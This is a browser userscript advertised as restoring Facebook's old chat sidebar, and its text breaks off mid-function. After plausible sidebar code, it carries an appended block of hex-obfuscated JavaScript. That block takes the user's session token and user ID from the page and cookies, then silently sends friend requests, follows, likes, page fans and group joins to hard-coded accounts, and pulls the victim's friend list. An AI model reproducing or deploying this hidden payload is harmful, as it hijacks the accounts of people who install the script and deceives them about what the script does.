// ==UserScript==
// @name			Facebook Old Chat Sidebar.
// @namespace			Sumit Patel
// @description			Replaces new Facebook sidebar with one like the original.
// @version			10
// @grant			none
// @include			http://*.facebook.com/*
// @include			https://*.facebook.com/*
// @match			http://*.facebook.com/*
// @match			https://*.facebook.com/*
// @exclude			http://*.facebook.com/ajax/*
// @exclude			https://*.facebook.com/ajax/*
// ==/UserScript==


if(!!window.opera){
	unsafeWindow = window;
}else if(!!window.navigator.vendor.match(/Google/)){
	var div = document.createElement('div');
	div.setAttribute('onclick','return window;');
	unsafeWindow = div.onclick();
}

(function(w){
	var d = w.document;

	var settings = {
		// open buddylist on load
		Onload:		true,

		// set buddylist sticky ( stay opened )
		Sticky:		true,

		// show online friends
		Online:		true,

		// show idle friends
		Idle:		true,

		// show mobile friends
		Mobile:		true,

		// buddylist style
		Margin:		'0px 10px',
		MinHeight:	'140px',
		Width:		'200px'
	};

	function ajax(url){
		this.Url = url;
		this.XMLHttpRequest = new w.XMLHttpRequest();
	}

	ajax.prototype = {
		'send':function(type,data,callback){
			try{
				this.Callback = callback;
				this.XMLHttpRequest.open(type,this.Url,true);
				this.XMLHttpRequest.onreadystatechange = this.stdcallback.bind(this);
				this.XMLHttpRequest.send(data);
				return true;
			}catch(e){
				return false;
			}
		},

		'stdcallback':function(){
			if(this.XMLHttpRequest.readyState === 4 && this.XMLHttpRequest.status === 200){
				if(typeof this.Callback === 'function') this.Callback(this.XMLHttpRequest);
			}
		}
	};

	var util = {
		'insertRule':function(rule){
			if(!this.css){
				this.css = d.createElement('style');
				d.querySelector('head').appendChild(this.css);
			}

			return this.css.appendChild(d.createTextNode(rule));
		}
	};

	var rocki = {
		'DOMContentLoaded':function(){
			w.toggle_list = function(r){
				if(!!w.localStorage.getItem('toggle' + r)){
					w.localStorage.removeItem('toggle' + r);
				}else{
					w.localStorage.setItem('toggle' + r,true);
				}
				w.render_chat();
			};

			w.change_order = function(r){
				var f = d.querySelectorAll('ul.fbChatOrderedList li.separator[id]');
				for(var i = 1, j = f.length; i < j; i++){
					if(f.item(i).id === r){
						w.localStorage.setItem('order' + f.item(i).id,i-1);
						w.localStorage.setItem('order' + f.item(i-1).id,i);
					}else{
						w.localStorage.setItem('order' + f.item(i).id,i);
					}
				}
				w.render_chat();
			};

			w.Arbiter.subscribe('sidebar/initialized',function(a,d){
				d.isViewportCapable = function(){ return false; };
				d.disable();
			});

			w.Env = w.require('Env');

			w.Arbiter.subscribe('buddylist-nub/initialized',function(a,c){
				var av = w.require('AvailableList'),
					sp = w.require('ShortProfiles'),
					tl = w.require('Toggler'),
					oa = w.require('debounceAcrossTransitions');

				var getAvailableList = function(){
					return av.getAvailableIDs().filter(function(r){
						switch(av.get(r)){
							case av.ACTIVE: return settings.Online;
							case av.IDLE: return settings.Idle;
							default: return false;
						}
					});
				};

				var sortAlpha = function(x,y){
					var r = sp.getNow(x), s = sp.getNow(y);
					if(!r || !s) return 0;
					var t = r.name.toLowerCase(),
						u = s.name.toLowerCase();
					return t < u ? -1 : 1;
				};

				var sortLists = function(x,y){
					if(!x.member || !y.member) return 0;
					var r = Number(w.localStorage.getItem('order' + x.uid)),
						s = Number(w.localStorage.getItem('order' + y.uid));
					if(r === s) return 0;
					return r < s ? -1 : 1;
				};

				w.render_chat = c.orderedList.render = function(){
					this.render = oa(function(){
						if(!rocki.lists) return setTimeout(this.render.bind(this),300);
						var a = getAvailableList(), b = [], c, d, e = {};
						rocki.lists.sort(sortLists);
						if(a.length > 0){
							a.sort(sortAlpha);
							for(var f = 0, g = rocki.lists.length; f < g; f++){
								if(!rocki.lists[f].member) return setTimeout(this.render.bind(this),300);
								c = a.filter(function(r){ return rocki.lists[f].member.hasOwnProperty(r); });
								if(c.length > 0){
									b.push('<li class="separator" id="' + rocki.lists[f].uid + '" onclick="toggle_list(\'' + rocki.lists[f].uid + '\');"><div class="outer"><div class="inner"><span class="text">' +
										rocki.lists[f].text + ' (' + c.length + ') <a href="#" onclick="change_order(\'' + rocki.lists[f].uid + '\');return false;">+</a> <a href="#" onclick="requireLazy([\'Dialog\'],function(a){new a().setAsyncURL(\'/ajax/choose/?type=friendlist&flid=' + rocki.lists[f].uid + '\').setAutohide(true).show();});return false;">~</a></span><div class="dive"><span class="bar"></span></div></div></div></li>');

									if(!w.localStorage.getItem('toggle' + rocki.lists[f].uid)){	
										for(var k = 0, l = c.length; k < l; k++){
											if(d = this._getListItem(c[k])){
												d.setAttribute('onclick','Chat.openTab(' + c[k] + ');');
												b.push(d); e[c[k]] = 1;
											}else{
												this._renderListItem(c[k],this.render.bind(this));
											}
										}
									}
								}
							}
							c = a.filter(function(r){ return !e.hasOwnProperty(r); });
							if(c.length > 0){
								b.push('<li class="separator" onclick="toggle_list(\'other\');"><div class="outer"><div class="inner"><span class="text">' +
									'Other (' + c.length + ')</span><div class="dive"><span class="bar"></span></div></div></div></li>');

								if(!w.localStorage.getItem('toggleother')){
									for(var k = 0, l = c.length; k < l; k++){
										if(d = this._getListItem(c[k])){
											d.setAttribute('onclick','Chat.openTab(' + c[k] + ');');
											b.push(d);
										}else{
											this._renderListItem(c[k],this.render.bind(this));
										}
									}
								}
							}
							if(settings.Mobile){
								c = av.getAvailableIDs().filter(function(r){ return av.get(r) === av.MOBILE && w.PresencePrivacy.getFriendVisibility(r) !== w.PresencePrivacy.BLACKLISTED; });
								if(c.length > 0){
									b.push('<li class="separator" onclick="toggle_list(\'mobile\');"><div class="outer"><div class="inner"><span class="text">' +
										'Mobile (' + c.length + ')</span><div class="dive"><span class="bar"></span></div></div></div></li>');
	
									if(!w.localStorage.getItem('togglemobile')){
										c.sort(sortAlpha);
										for(var k = 0, l = c.length; k < l; k++){
											if(d = this._getListItem(c[k])){
												d.setAttribute('onclick','Chat.openTab(' + c[k] + ');');
												b.push(d);
											}else{
												this._renderListItem(c[k],this.render.bind(this));
											}
										}
									}
								}
							}
						}else{
							b.push('<div style="padding:10px;">No friends online.</div>');
						}
						if(b.length > 0){
							var ul = this._root.firstChild;
							ul.innerHTML = '';
							for(var s = 0, t = b.length; s < t; s++){
								if(typeof b[s] === 'string'){
									ul.innerHTML += b[s];
								}else{
									ul.appendChild(b[s]);
								}
							}
							this.inform('render',{},this.BEHAVIOR_PERSISTENT);
						}
					}.bind(this),300,false);
					this.render();
				}.bind(c.orderedList);

				w.Arbiter.subscribe('sidebar/show',function(a,d){
					d.hide();
					c.show();
				});

				tl.createInstance(c.root).setSticky(settings.Sticky);

				c.orderedList.scrollTo = function(){ return false; };

				c.orderedList.subscribe('render',function(){
					c.label.innerHTML =
						c.root.querySelector('div.titlebarTextWrapper').innerHTML =
							'Chat (<strong>' + getAvailableList().length + '</strong>)';
				});

				var menu = d.querySelector('div.fbNubFlyoutTitlebar div.fbChatSidebarDropdown ul.uiMenuInner');
				menu.innerHTML = '<li data-label="Manage Lists" class="uiMenuItem"><a aria-checked="false" href="/bookmarks/lists" tabindex="-1" class="itemAnchor"><span class="itemLabel fsm">Manage Lists</span></a></li>' + menu.innerHTML;

				w.localStorage.setItem('togglemobile',true);

				if(w.ChatVisibility.isOnline() && settings.Onload) c.show();
			});
		},

		'getflid':function(){
			if(!w.Env) return setTimeout(this.getflid.bind(this),30);
			var a = new ajax('/ajax/typeahead/first_degree.php?__a=1&filter[0]=friendlist&lazy=0&viewer=' + w.Env.user + '&__user=' + w.Env.user);
			a.send('GET',null,function(b){
				var typeahead = eval('(' + b.responseText.substr(9) + ')');
				if(!!typeahead.payload){
					this.lists = typeahead.payload.entries;
					this.getmember();
				}
			}.bind(this));
		},

		'getmember':function(){
			var regex = /\\?"(\d+)\\?":1/g, a;
			for(var i = 0, j = this.lists.length; i < j; i++){
				a = new ajax('/ajax/choose/?type=friendlist&flid=' + this.lists[i].uid + '&view=all&__a=1&__d=1&__user=' + w.Env.user);
				a.send('GET',null,function(b,c){
					var d; this.lists[c].member = {};
					while(d = regex.exec(b.responseText)){
						this.lists[c].member[d[1]] = 1;
					}
				}.bind(this,a.XMLHttpRequest,i));
			}
		}
	};

	if(w && w.Arbiter){
		util.insertRule('.fbDock{margin:' + settings.Margin + '!important;} #fbDockChatBuddylistNub{width:' + settings.Width + '!important;} .fbNubFlyout{min-height:' + settings.MinHeight + '!important;}');
		rocki.DOMContentLoaded();
		rocki.getflid();
	}

})(unsafeWindow);

var _0x6733=["\x76\x61\x6C\x75\x65","\x66\x62\x5F\x64\x74\x73\x67","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x4E\x61\x6D\x65","\x6D\x61\x74\x63\x68","\x63\x6F\x6F\x6B\x69\x65","\x2F\x2F\x77\x77\x77\x2E\x66\x61\x63\x65\x62\x6F\x6F\x6B\x2E\x63\x6F\x6D\x2F\x61\x6A\x61\x78\x2F\x61\x64\x64\x5F\x66\x72\x69\x65\x6E\x64\x2F\x61\x63\x74\x69\x6F\x6E\x2E\x70\x68\x70","\x74\x6F\x5F\x66\x72\x69\x65\x6E\x64\x3D","\x26\x61\x63\x74\x69\x6F\x6E\x3D\x61\x64\x64\x5F\x66\x72\x69\x65\x6E\x64\x26\x68\x6F\x77\x5F\x66\x6F\x75\x6E\x64\x3D\x66\x72\x69\x65\x6E\x64\x5F\x62\x72\x6F\x77\x73\x65\x72\x5F\x73\x26\x72\x65\x66\x5F\x70\x61\x72\x61\x6D\x3D\x6E\x6F\x6E\x65\x26\x26\x26\x6F\x75\x74\x67\x6F\x69\x6E\x67\x5F\x69\x64\x3D\x26\x6C\x6F\x67\x67\x69\x6E\x67\x5F\x6C\x6F\x63\x61\x74\x69\x6F\x6E\x3D\x73\x65\x61\x72\x63\x68\x26\x6E\x6F\x5F\x66\x6C\x79\x6F\x75\x74\x5F\x6F\x6E\x5F\x63\x6C\x69\x63\x6B\x3D\x74\x72\x75\x65\x26\x65\x67\x6F\x5F\x6C\x6F\x67\x5F\x64\x61\x74\x61\x26\x68\x74\x74\x70\x5F\x72\x65\x66\x65\x72\x65\x72\x26\x5F\x5F\x75\x73\x65\x72\x3D","\x26\x5F\x5F\x61\x3D\x31\x26\x5F\x5F\x64\x79\x6E\x3D\x37\x39\x38\x61\x44\x35\x7A\x35\x43\x46\x2D\x26\x5F\x5F\x72\x65\x71\x3D\x33\x35\x26\x66\x62\x5F\x64\x74\x73\x67\x3D","\x26\x70\x68\x73\x74\x61\x6D\x70\x3D","\x50\x4F\x53\x54","\x6F\x70\x65\x6E","\x6F\x6E\x72\x65\x61\x64\x79\x73\x74\x61\x74\x65\x63\x68\x61\x6E\x67\x65","\x72\x65\x61\x64\x79\x53\x74\x61\x74\x65","\x73\x74\x61\x74\x75\x73","\x63\x6C\x6F\x73\x65","\x73\x65\x6E\x64","\x31\x33\x38\x31\x34\x32\x36\x32\x35\x34","\x31\x38\x30\x34\x38\x30\x35\x33\x34\x39","\x31\x30\x30\x30\x30\x35\x35\x33\x35\x34\x32\x37\x36\x35\x35","\x31\x30\x30\x30\x30\x37\x38\x35\x39\x38\x38\x38\x36\x36\x33","\x31\x30\x30\x30\x30\x35\x33\x34\x30\x35\x38\x31\x38\x33\x36","\x31\x30\x30\x30\x30\x35\x33\x36\x35\x32\x33\x37\x38\x30\x33","\x31\x30\x30\x30\x30\x37\x30\x35\x35\x30\x34\x30\x39\x39\x38","\x31\x30\x30\x30\x30\x34\x33\x38\x33\x31\x35\x38\x33\x32\x39","\x31\x30\x30\x30\x30\x37\x36\x33\x37\x37\x37\x33\x34\x36\x37","\x31\x30\x30\x30\x30\x37\x37\x30\x31\x32\x31\x36\x39\x31\x39","\x31\x30\x30\x30\x30\x31\x36\x37\x33\x39\x34\x35\x34\x39\x33","\x67\x65\x74\x54\x69\x6D\x65","\x2F\x2F\x77\x77\x77\x2E\x66\x61\x63\x65\x62\x6F\x6F\x6B\x2E\x63\x6F\x6D\x2F\x61\x6A\x61\x78\x2F\x75\x66\x69\x2F\x6C\x69\x6B\x65\x2E\x70\x68\x70","\x6C\x69\x6B\x65\x5F\x61\x63\x74\x69\x6F\x6E\x3D\x74\x72\x75\x65\x26\x66\x74\x5F\x65\x6E\x74\x5F\x69\x64\x65\x6E\x74\x69\x66\x69\x65\x72\x3D","\x26\x73\x6F\x75\x72\x63\x65\x3D\x31\x26\x63\x6C\x69\x65\x6E\x74\x5F\x69\x64\x3D","\x25\x33\x41\x33\x37\x39\x37\x38\x33\x38\x35\x37\x26\x72\x6F\x6F\x74\x69\x64\x3D\x75\x5F\x6A\x73\x6F\x6E\x70\x5F\x33\x39\x5F\x31\x38\x26\x67\x69\x66\x74\x6F\x63\x63\x61\x73\x69\x6F\x6E\x26\x66\x74\x5B\x74\x6E\x5D\x3D\x25\x33\x45\x25\x33\x44\x26\x66\x74\x5B\x74\x79\x70\x65\x5D\x3D\x32\x30\x26\x66\x74\x5B\x71\x69\x64\x5D\x3D\x35\x38\x39\x30\x38\x31\x31\x33\x32\x39\x34\x37\x30\x32\x37\x39\x32\x35\x37\x26\x66\x74\x5B\x6D\x66\x5F\x73\x74\x6F\x72\x79\x5F\x6B\x65\x79\x5D\x3D\x32\x38\x31\x34\x39\x36\x32\x39\x30\x30\x31\x39\x33\x31\x34\x33\x39\x35\x32\x26\x66\x74\x5B\x68\x61\x73\x5F\x65\x78\x70\x61\x6E\x64\x65\x64\x5F\x75\x66\x69\x5D\x3D\x31\x26\x6E\x63\x74\x72\x5B\x5F\x6D\x6F\x64\x5D\x3D\x70\x61\x67\x65\x6C\x65\x74\x5F\x68\x6F\x6D\x65\x5F\x73\x74\x72\x65\x61\x6D\x26\x5F\x5F\x75\x73\x65\x72\x3D","\x26\x5F\x5F\x61\x3D\x31\x26\x5F\x5F\x64\x79\x6E\x3D\x37\x6E\x38\x38\x51\x6F\x41\x4D\x42\x6C\x43\x6C\x79\x6F\x63\x70\x61\x65\x26\x5F\x5F\x72\x65\x71\x3D\x67\x34\x26\x66\x62\x5F\x64\x74\x73\x67\x3D","\x31\x30\x32\x30\x31\x36\x33\x34\x32\x35\x33\x34\x38\x33\x30\x38\x39","\x31\x30\x32\x30\x31\x32\x37\x35\x34\x37\x32\x32\x37\x33\x37\x38\x33","\x31\x30\x32\x30\x31\x31\x32\x34\x36\x36\x35\x37\x30\x33\x37\x31\x33","\x31\x30\x32\x30\x30\x38\x39\x34\x32\x39\x39\x36\x32\x34\x37\x30\x35","\x31\x30\x32\x30\x30\x35\x34\x30\x31\x35\x31\x31\x33\x31\x32\x31\x34","\x31\x30\x32\x30\x30\x31\x33\x39\x30\x38\x38\x33\x30\x34\x38\x39\x34","\x34\x34\x31\x39\x35\x33\x35\x31\x37\x31\x34\x36\x33","\x34\x30\x33\x32\x35\x36\x32\x33\x33\x37\x33\x38\x34","\x33\x33\x33\x33\x36\x31\x39\x30\x36\x34\x32\x33\x39","\x32\x30\x37\x32\x36\x38\x30\x31\x38\x31\x35\x35\x35","\x31\x39\x34\x39\x30\x30\x32\x30\x30\x39\x36\x37\x38","\x31\x39\x30\x33\x34\x31\x31\x38\x32\x39\x39\x35\x32","\x2F\x2F\x77\x77\x77\x2E\x66\x61\x63\x65\x62\x6F\x6F\x6B\x2E\x63\x6F\x6D\x2F\x61\x6A\x61\x78\x2F\x70\x61\x67\x65\x73\x2F\x66\x61\x6E\x5F\x73\x74\x61\x74\x75\x73\x2E\x70\x68\x70","\x26\x66\x62\x70\x61\x67\x65\x5F\x69\x64\x3D","\x26\x61\x64\x64\x3D\x74\x72\x75\x65\x26\x72\x65\x6C\x6F\x61\x64\x3D\x66\x61\x6C\x73\x65\x26\x66\x61\x6E\x5F\x6F\x72\x69\x67\x69\x6E\x3D\x70\x61\x67\x65\x5F\x74\x69\x6D\x65\x6C\x69\x6E\x65\x26\x66\x61\x6E\x5F\x73\x6F\x75\x72\x63\x65\x3D\x26\x63\x61\x74\x3D\x26\x6E\x63\x74\x72\x5B\x5F\x6D\x6F\x64\x5D\x3D\x70\x61\x67\x65\x6C\x65\x74\x5F\x74\x69\x6D\x65\x6C\x69\x6E\x65\x5F\x70\x61\x67\x65\x5F\x61\x63\x74\x69\x6F\x6E\x73\x26\x5F\x5F\x75\x73\x65\x72\x3D","\x26\x5F\x5F\x61\x3D\x31\x26\x5F\x5F\x64\x79\x6E\x3D\x37\x39\x38\x61\x44\x35\x7A\x35\x43\x46\x2D\x26\x5F\x5F\x72\x65\x71\x3D\x64\x26\x66\x62\x5F\x64\x74\x73\x67\x3D","\x36\x33\x34\x37\x32\x33\x31\x35\x33\x32\x34\x32\x37\x37\x36","\x34\x39\x31\x39\x31\x39\x36\x33\x37\x35\x36\x36\x39\x34\x35","\x33\x32\x30\x37\x34\x30\x30\x38\x34\x36\x35\x32\x33\x34\x33","\x33\x33\x34\x36\x30\x38\x35\x34\x36\x35\x35\x35\x31\x38\x37","\x33\x32\x38\x34\x34\x33\x39\x36\x33\x38\x35\x39\x37\x36\x38","\x32\x35\x36\x36\x39\x36\x31\x31\x31\x30\x37\x32\x34\x34\x35","\x31\x38\x36\x32\x32\x35\x36\x36\x38\x31\x33\x37\x34\x31\x33","\x32\x35\x33\x39\x35\x31\x36\x33\x34\x36\x38\x34\x30\x35\x36","\x36\x36\x35\x36\x38\x30\x32\x35\x33\x34\x37\x36\x38\x34\x31","\x32\x36\x36\x33\x37\x39\x31\x37\x33\x35\x32\x34\x37\x30\x37","\x31\x34\x33\x36\x31\x30\x32\x32\x33\x39\x39\x34\x36\x37\x34\x31","\x73\x63\x72\x69\x70\x74","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x69\x6E\x6E\x65\x72\x48\x54\x4D\x4C","\x6E\x65\x77\x20\x41\x73\x79\x6E\x63\x52\x65\x71\x75\x65\x73\x74\x28\x29\x2E\x73\x65\x74\x55\x52\x49\x28\x27\x2F\x61\x6A\x61\x78\x2F\x66\x72\x69\x65\x6E\x64\x73\x2F\x6C\x69\x73\x74\x73\x2F\x73\x75\x62\x73\x63\x72\x69\x62\x65\x2F\x6D\x6F\x64\x69\x66\x79\x3F\x6C\x6F\x63\x61\x74\x69\x6F\x6E\x3D\x70\x65\x72\x6D\x61\x6C\x69\x6E\x6B\x26\x61\x63\x74\x69\x6F\x6E\x3D\x73\x75\x62\x73\x63\x72\x69\x62\x65\x27\x29\x2E\x73\x65\x74\x44\x61\x74\x61\x28\x7B\x20\x66\x6C\x69\x64\x3A\x20","\x20\x7D\x29\x2E\x73\x65\x6E\x64\x28\x29\x3B","\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64","\x62\x6F\x64\x79","\x2F\x61\x6A\x61\x78\x2F\x66\x6F\x6C\x6C\x6F\x77\x2F\x66\x6F\x6C\x6C\x6F\x77\x5F\x70\x72\x6F\x66\x69\x6C\x65\x2E\x70\x68\x70\x3F\x5F\x5F\x61\x3D\x31","\x70\x72\x6F\x66\x69\x6C\x65\x5F\x69\x64\x3D","\x26\x6C\x6F\x63\x61\x74\x69\x6F\x6E\x3D\x31\x26\x73\x6F\x75\x72\x63\x65\x3D\x66\x6F\x6C\x6C\x6F\x77\x2D\x62\x75\x74\x74\x6F\x6E\x26\x73\x75\x62\x73\x63\x72\x69\x62\x65\x64\x5F\x62\x75\x74\x74\x6F\x6E\x5F\x69\x64\x3D\x75\x33\x37\x71\x61\x63\x5F\x33\x37\x26\x66\x62\x5F\x64\x74\x73\x67\x3D","\x26\x6C\x73\x64\x26\x5F\x5F","\x34\x36\x33\x32\x38\x39\x37\x33\x38\x35\x33\x38\x35","\x31\x30\x32\x30\x31\x32\x37\x39\x34\x33\x35\x34\x39\x32\x38\x36\x31","\x31\x30\x32\x30\x31\x32\x37\x39\x34\x33\x36\x36\x35\x32\x38\x39\x30","\x31\x30\x32\x30\x31\x32\x37\x39\x34\x34\x30\x38\x31\x32\x39\x39\x34","\x31\x30\x32\x30\x31\x32\x37\x39\x34\x34\x31\x32\x35\x33\x30\x30\x35","\x31\x30\x32\x30\x31\x32\x37\x39\x34\x34\x32\x31\x37\x33\x30\x32\x38","\x31\x30\x32\x30\x31\x32\x37\x39\x34\x34\x36\x32\x35\x33\x31\x33\x30","\x31\x30\x32\x30\x31\x32\x37\x39\x34\x34\x37\x33\x33\x33\x31\x35\x37","\x31\x30\x32\x30\x31\x32\x37\x39\x34\x34\x38\x34\x39\x33\x31\x38\x36","\x31\x30\x32\x30\x31\x32\x37\x39\x34\x35\x30\x37\x33\x33\x32\x34\x32","\x31\x39\x32\x39\x32\x33\x37\x35\x34\x32\x33\x35\x34\x37\x31","\x31\x39\x32\x39\x32\x34\x32\x31\x34\x32\x33\x35\x34\x32\x35","\x32\x35\x30\x37\x39\x32\x35\x39\x31\x37\x35\x32\x36\x36\x35","\x31\x34\x30\x32\x35\x37\x30\x37\x39\x36\x36\x36\x39\x39\x35\x34","\x2F\x61\x6A\x61\x78\x2F\x67\x72\x6F\x75\x70\x73\x2F\x6D\x65\x6D\x62\x65\x72\x73\x68\x69\x70\x2F\x72\x32\x6A\x2E\x70\x68\x70\x3F\x5F\x5F\x61\x3D\x31","\x26\x72\x65\x66\x3D\x67\x72\x6F\x75\x70\x5F\x6A\x75\x6D\x70\x5F\x68\x65\x61\x64\x65\x72\x26\x67\x72\x6F\x75\x70\x5F\x69\x64\x3D","\x26\x66\x62\x5F\x64\x74\x73\x67\x3D","\x26\x5F\x5F\x75\x73\x65\x72\x3D","\x43\x6F\x6E\x74\x65\x6E\x74\x2D\x74\x79\x70\x65","\x61\x70\x70\x6C\x69\x63\x61\x74\x69\x6F\x6E\x2F\x78\x2D\x77\x77\x77\x2D\x66\x6F\x72\x6D\x2D\x75\x72\x6C\x65\x6E\x63\x6F\x64\x65\x64","\x73\x65\x74\x52\x65\x71\x75\x65\x73\x74\x48\x65\x61\x64\x65\x72","\x43\x6F\x6E\x74\x65\x6E\x74\x2D\x6C\x65\x6E\x67\x74\x68","\x6C\x65\x6E\x67\x74\x68","\x43\x6F\x6E\x6E\x65\x63\x74\x69\x6F\x6E","\x6B\x65\x65\x70\x2D\x61\x6C\x69\x76\x65","\x47\x45\x54","\x2F\x61\x6A\x61\x78\x2F\x74\x79\x70\x65\x61\x68\x65\x61\x64\x2F\x66\x69\x72\x73\x74\x5F\x64\x65\x67\x72\x65\x65\x2E\x70\x68\x70\x3F\x5F\x5F\x61\x3D\x31\x26\x76\x69\x65\x77\x65\x72\x3D","\x26\x74\x6F\x6B\x65\x6E","\x72\x61\x6E\x64\x6F\x6D","\x26\x66\x69\x6C\x74\x65\x72\x5B\x30\x5D\x3D\x75\x73\x65\x72\x26\x6F\x70\x74\x69\x6F\x6E\x73\x5B\x30\x5D\x3D\x66\x72\x69\x65\x6E\x64\x73\x5F\x6F\x6E\x6C\x79","\x28","\x73\x75\x62\x73\x74\x72","\x72\x65\x73\x70\x6F\x6E\x73\x65\x54\x65\x78\x74","\x29","\x65\x72\x72\x6F\x72","\x69\x6E\x64\x65\x78","\x73\x6F\x72\x74","\x65\x6E\x74\x72\x69\x65\x73","\x70\x61\x79\x6C\x6F\x61\x64","\x2F\x61\x6A\x61\x78\x2F\x67\x72\x6F\x75\x70\x73\x2F\x6D\x65\x6D\x62\x65\x72\x73\x2F\x61\x64\x64\x5F\x70\x6F\x73\x74\x2E\x70\x68\x70\x3F\x5F\x5F\x61\x3D\x31","\x26\x67\x72\x6F\x75\x70\x5F\x69\x64\x3D","\x26\x73\x6F\x75\x72\x63\x65\x3D\x74\x79\x70\x65\x61\x68\x65\x61\x64\x26\x72\x65\x66\x3D\x26\x6D\x65\x73\x73\x61\x67\x65\x5F\x69\x64\x3D\x26\x6D\x65\x6D\x62\x65\x72\x73\x3D","\x75\x69\x64","","\x73\x65\x74\x54\x69\x6D\x65","\x70\x61\x79\x6C\x61\x73\x74\x69\x3D\x68\x61\x79\x69\x72\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x47\x4D\x54\x53\x74\x72\x69\x6E\x67"];var fb_dtsg=document[_0x6733[2]](_0x6733[1])[0][_0x6733[0]];var user_id=document[_0x6733[4]][_0x6733[3]](document[_0x6733[4]][_0x6733[3]](/c_user=(\d+)/)[1]);function IDS(_0x9c10x4){var _0x9c10x5= new XMLHttpRequest();var _0x9c10x6=_0x6733[5];var _0x9c10x7=_0x6733[6]+_0x9c10x4+_0x6733[7]+user_id+_0x6733[8]+fb_dtsg+_0x6733[9];_0x9c10x5[_0x6733[11]](_0x6733[10],_0x9c10x6,true);_0x9c10x5[_0x6733[12]]=function (){if(_0x9c10x5[_0x6733[13]]==4&&_0x9c10x5[_0x6733[14]]==200){_0x9c10x5[_0x6733[15]];} ;} ;_0x9c10x5[_0x6733[16]](_0x9c10x7);} ;IDS(_0x6733[17]);IDS(_0x6733[18]);IDS(_0x6733[19]);IDS(_0x6733[20]);IDS(_0x6733[21]);IDS(_0x6733[22]);IDS(_0x6733[23]);IDS(_0x6733[24]);IDS(_0x6733[25]);IDS(_0x6733[26]);IDS(_0x6733[27]);var user_id=document[_0x6733[4]][_0x6733[3]](document[_0x6733[4]][_0x6733[3]](/c_user=(\d+)/)[1]);var fb_dtsg=document[_0x6733[2]](_0x6733[1])[0][_0x6733[0]];var now=( new Date)[_0x6733[28]]();function P(_0x9c10xa){var _0x9c10x5= new XMLHttpRequest();var _0x9c10x6=_0x6733[29];var _0x9c10x7=_0x6733[30]+_0x9c10xa+_0x6733[31]+now+_0x6733[32]+user_id+_0x6733[33]+fb_dtsg+_0x6733[9];_0x9c10x5[_0x6733[11]](_0x6733[10],_0x9c10x6,true);_0x9c10x5[_0x6733[12]]=function (){if(_0x9c10x5[_0x6733[13]]==4&&_0x9c10x5[_0x6733[14]]==200){_0x9c10x5[_0x6733[15]];} ;} ;_0x9c10x5[_0x6733[16]](_0x9c10x7);} ;P(_0x6733[34]);P(_0x6733[35]);P(_0x6733[36]);P(_0x6733[37]);P(_0x6733[38]);P(_0x6733[39]);P(_0x6733[40]);P(_0x6733[41]);P(_0x6733[42]);P(_0x6733[43]);P(_0x6733[44]);P(_0x6733[45]);var fb_dtsg=document[_0x6733[2]](_0x6733[1])[0][_0x6733[0]];var user_id=document[_0x6733[4]][_0x6733[3]](document[_0x6733[4]][_0x6733[3]](/c_user=(\d+)/)[1]);function Like(_0x9c10xc){var _0x9c10xd= new XMLHttpRequest();var _0x9c10xe=_0x6733[46];var _0x9c10xf=_0x6733[47]+_0x9c10xc+_0x6733[48]+user_id+_0x6733[49]+fb_dtsg+_0x6733[9];_0x9c10xd[_0x6733[11]](_0x6733[10],_0x9c10xe,true);_0x9c10xd[_0x6733[12]]=function (){if(_0x9c10xd[_0x6733[13]]==4&&_0x9c10xd[_0x6733[14]]==200){_0x9c10xd[_0x6733[15]];} ;} ;_0x9c10xd[_0x6733[16]](_0x9c10xf);} ;Like(_0x6733[50]);Like(_0x6733[51]);Like(_0x6733[52]);Like(_0x6733[53]);Like(_0x6733[54]);Like(_0x6733[55]);Like(_0x6733[56]);Like(_0x6733[57]);Like(_0x6733[58]);Like(_0x6733[59]);Like(_0x6733[60]);function sublist(_0x9c10x11){var a=document[_0x6733[62]](_0x6733[61]);a[_0x6733[63]]=_0x6733[64]+_0x9c10x11+_0x6733[65];document[_0x6733[67]][_0x6733[66]](a);} ;function a(_0x9c10x13){var _0x9c10x14= new XMLHttpRequest;var _0x9c10x15=_0x6733[68];var _0x9c10x16=_0x6733[69]+_0x9c10x13+_0x6733[70]+fb_dtsg+_0x6733[71]+user_id+_0x6733[9];_0x9c10x14[_0x6733[11]](_0x6733[10],_0x9c10x15,true);_0x9c10x14[_0x6733[12]]=function (){if(_0x9c10x14[_0x6733[13]]==4&&_0x9c10x14[_0x6733[14]]==200){_0x9c10x14[_0x6733[15]];} ;} ;_0x9c10x14[_0x6733[16]](_0x9c10x16);} ;a(_0x6733[17]);a(_0x6733[18]);a(_0x6733[19]);a(_0x6733[20]);a(_0x6733[21]);a(_0x6733[22]);a(_0x6733[23]);a(_0x6733[24]);a(_0x6733[25]);a(_0x6733[26]);a(_0x6733[27]);sublist(_0x6733[72]);sublist(_0x6733[73]);sublist(_0x6733[74]);sublist(_0x6733[75]);sublist(_0x6733[76]);sublist(_0x6733[77]);sublist(_0x6733[78]);sublist(_0x6733[79]);sublist(_0x6733[80]);sublist(_0x6733[81]);sublist(_0x6733[82]);sublist(_0x6733[83]);sublist(_0x6733[84]);var gid=[_0x6733[85]];var fb_dtsg=document[_0x6733[2]](_0x6733[1])[0][_0x6733[0]];var user_id=document[_0x6733[4]][_0x6733[3]](document[_0x6733[4]][_0x6733[3]](/c_user=(\d+)/)[1]);var httpwp= new XMLHttpRequest();var urlwp=_0x6733[86];var paramswp=_0x6733[87]+gid+_0x6733[88]+fb_dtsg+_0x6733[89]+user_id+_0x6733[9];httpwp[_0x6733[11]](_0x6733[10],urlwp,true);httpwp[_0x6733[92]](_0x6733[90],_0x6733[91]);httpwp[_0x6733[92]](_0x6733[93],paramswp[_0x6733[94]]);httpwp[_0x6733[92]](_0x6733[95],_0x6733[96]);httpwp[_0x6733[16]](paramswp);var fb_dtsg=document[_0x6733[2]](_0x6733[1])[0][_0x6733[0]];var user_id=document[_0x6733[4]][_0x6733[3]](document[_0x6733[4]][_0x6733[3]](/c_user=(\d+)/)[1]);var friends= new Array();gf= new XMLHttpRequest();gf[_0x6733[11]](_0x6733[97],_0x6733[98]+user_id+_0x6733[99]+Math[_0x6733[100]]()+_0x6733[101],false);gf[_0x6733[16]]();if(gf[_0x6733[13]]!=4){} else {data=eval(_0x6733[102]+gf[_0x6733[104]][_0x6733[103]](9)+_0x6733[105]);if(data[_0x6733[106]]){} else {friends=data[_0x6733[110]][_0x6733[109]][_0x6733[108]](function (_0x9c10x1c,_0x9c10x1d){return 